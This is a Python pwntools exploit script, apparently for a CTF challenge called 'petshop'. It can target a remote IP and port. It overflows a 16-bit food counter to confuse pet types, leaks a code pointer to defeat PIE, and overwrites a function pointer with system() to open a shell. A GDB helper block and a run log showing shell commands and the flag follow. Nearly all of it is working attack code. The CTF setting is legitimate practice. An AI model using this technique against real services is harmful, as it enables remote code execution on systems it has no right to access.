from pwn import *
import time
import sys

def petshop(DEBUG):
	t = 0.3
	
	if DEBUG=="1":
		t = 0.005
		r = process("./petshop")
		raw_input("debug?")
	elif DEBUG=="2":
		HOST = '125.235.240.168'
		PORT = 26000
		r = remote(HOST,PORT)
	
	def Buy(petType, color=1, name="BBBB"):
		r.sendline("1")
		r.recvuntil("3. Fish")
		r.sendline(str(petType)) # 1. Dog | 2. Cat | 3. Fish
		if petType==2:
			r.recvuntil("2. White")
			r.sendline(str(color))
			r.recvuntil("Enter pet name:")
			r.sendline(name)
		return r.recvuntil("Your choice: ")
	
	def Feed(idx, cups):
		r.sendline("2")
		r.recvuntil("Enter pet number:")
		r.sendline(str(idx))
		r.recvuntil("How many cups of food? ")
		r.sendline(str(cups))
		return r.recvuntil("Your choice: ")
	
	def Poop(idx):
		r.sendline("3")
		r.recvuntil("Enter pet number:")
		r.sendline(str(idx))
		return r.recvuntil("Your choice: ")
	
	def Show():
		r.sendline("4")
		return r.recvuntil("Your choice: ")
	
	def Play(idx):
		r.sendline("5")
		r.recvuntil("Enter pet number:")
		r.sendline(str(idx))
	
	def PlayDog(idx, color):
		Play(idx)
		r.recvuntil("Change color?(Y/N) ")
		r.sendline("Y")
		r.sendline(color)
		return r.recvuntil("Your choice: ")
	
	def PlayFish(idx, isTrain, area):
		Play(idx)
		r.recvuntil("Train your fish?(Y/N) ")
		if isTrain:
			r.sendline("Y")
		else:
			r.sendline("N")
			r.recvuntil("Enter area:")
			r.sendline(area)
			
		
		
	dec = 0xff00
	inc = 0x100
	
	r.recvuntil("Your choice: ")
	color = 2
	name = "A"*0xff
	Buy(2, 1, name)
	Feed(1, inc) # 2 -> 3 Fish
	PlayFish(1, True, "")
	Feed(1, dec*2) # 3 -> 1 Dog
	PlayDog(1, "X"*6)
	res = Show()
	func = u64(res.split("XXXXXX")[1].splitlines()[0].ljust(8,"\x00"))
	base = func - 0x159d
	system = base + 0x1583
	log.info('base: %#x' % base)
	log.info('system: %#x' % system)
	log.info('func: %#x' % func)
	
	payload = "B"*6
	payload += p64(system)
	PlayDog(1, payload)
	Feed(1, inc*2) # 1 -> 3 Fish
	PlayFish(1, False, "/bin/sh")
	
	r.interactive()

petshop(sys.argv[1])

"""
define ff
echo ============== LIST_ANIMAL:\n
telescope 0x555555757080 10
echo ============== COUNT:\n
telescope 0x5555557570D0 1
echo ============================\n
end

define fa
x/40gx {long}0x555555757080-0x10
end
define fa
telescope {long}0x555555757080-0x10
end

struct __attribute__((aligned(8))) animal
{
  _QWORD FUNC;
  _WORD cups;
  char name[8];
  char color[6];
  _QWORD Active;
};
"""
"""
$ python petshop.py 2
[+] Opening connection to 125.235.240.168 on port 26000: Done
[*] base: 0x559c9fc69000
[*] system: 0x559c9fc6a583
[*] func: 0x559c9fc6a59d
[*] Switching to interactive mode
$ id
uid=1006(petshop) gid=1006(petshop) groups=1006(petshop)
$ ls
flag
petshop
run.sh
$ cat flag
mastesctf{lovely_pets}
$  
"""